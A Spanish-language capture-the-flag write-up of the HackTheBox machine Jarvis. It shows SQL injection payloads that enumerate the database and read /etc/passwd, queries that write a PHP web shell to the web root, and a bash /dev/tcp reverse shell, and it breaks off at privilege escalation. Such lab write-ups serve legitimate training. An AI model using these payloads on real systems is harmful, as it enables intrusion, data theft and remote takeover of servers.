# Writeup - Máquina Jarvis HTB

**Plataforma**: HackTheBox  
**Dificultad**: Media  
**Sistema**: Linux  

---

## Reconocimiento

Lanzamos un nmap para descubrir puertos abiertos:
```
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.143
```
![Resultado de Nmap](IMG/nmap.png)

Vemos que tenemos abierto el puerto 80 donde esta corriendo un servicio http

Se le hechamos un vistazo a la url de una habitacion vemos que se añade un parametro

![Resultado de Nmap](IMG/hotel.png)

Si introducimos una comilla, vemos que la pagina se rompe, por lo que nos lleva a pensar que podria ser vulnerable a una SQLI

![Resultado de Nmap](IMG/comilla.png)

Comenzamos descubriendo el numero de columnas que tiene la base de datos con el siguiente payload

```
union select 1,2,3,4,5,6,7-- -
```
Vemos que tiene 7 columnas

![Resultado de Nmap](IMG/columnas.png)

Vemos que tenemos control sobre la columna 3 asi que probamos a imprimir por pantalla "test"

![Resultado de Nmap](IMG/test.png)

Procedemos ahora a listar la base de datos en la que estamos 

```
union select 1,2,database(),4,5,6,7-- -
```
![Resultado de Nmap](IMG/bd.png)

Asi tambien como su version

```
union select 1,2,version(),4,5,6,7-- -
```
![Resultado de Nmap](IMG/version.png)

Como tambien el usuario que esta corriendo la base de datos

```
union select 1,2,user(),4,5,6,7-- -
```
![Resultado de Nmap](IMG/user.png)

Tambien podriamos leer archivos internos de la maquina como el /etc/passwd

```
union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -
```
![Resultado de Nmap](IMG/file.png)

Vamos ahora a enumerar la base de datos que hay

```
union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- -
```
Vemos que no nos reporta todas las bases de datos, y esto ocurre por que el campo no te permite meterle multiple informacion

![Resultado de Nmap](IMG/bd1.png)

En este caso lo que podemos hacer es limitar el output en una unica unidad en cuanto a resultados respecta

```
union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- -
```
![Resultado de Nmap](IMG/bd2.png)

Vamos ahora a tratar de enumerar las tablas de la base de datos hotel

```
union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 0,1-- -
```
Esta es la primera tabla de la base de datos de hotel

![Resultado de Nmap](IMG/bd3.png)

Vemos si hay mas

```
union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 1,1-- -
```
Pero vemos que es la unica

![Resultado de Nmap](IMG/bd4.png)

Ahora vamos ahora a listar las columnas

```
union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- -
```
![Resultado de Nmap](IMG/bd5.png)

![Resultado de Nmap](IMG/bd6.png)

Tambien podemos agruparlas todas

```
union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- -
```
![Resultado de Nmap](IMG/bd7.png)

Vemos que no hay ninguna base de datos con usuarios ni contraseñas, asi que podemos hacer otra cosa

Como la web interpreta php, lo que podriamos hacer es intentar crear un archivo con extension .php en una ruta de la maquina para ver si lo interpreta

```
union select 1,2,"<?php system('whoami'); ?>",4,5,6,7 into outfile "/var/www/html/test.php"-- -
```
![Resultado de Nmap](IMG/bd8.png)

Y si ahora visitamos esa ruta vemos que tenemos ejecucion remota de comandos

![Resultado de Nmap](IMG/rce.png)

Vamos a crearnos un archivo donde nosotros podamos ejecutar el comando que queramos

```
union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/reverseshell.php"-- -
```
![Resultado de Nmap](IMG/reverse.png)

Y ahora podemos ejecutar comandos

![Resultado de Nmap](IMG/reverse1.png)

Ahora nos mandamos una shell

Probamos la tipica reverseshell pero vemos que no nos funciona

```
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
```

Asi que la urlencodemos y entramos

![Resultado de Nmap](IMG/reverse2.png)

# ESCALADA DE PRIVILEGIOS

Si ejecutamos el comando sudo -l vemos que tenemos permisos para ejectar un script

![Resultado de Nmap](IMG/script.png)




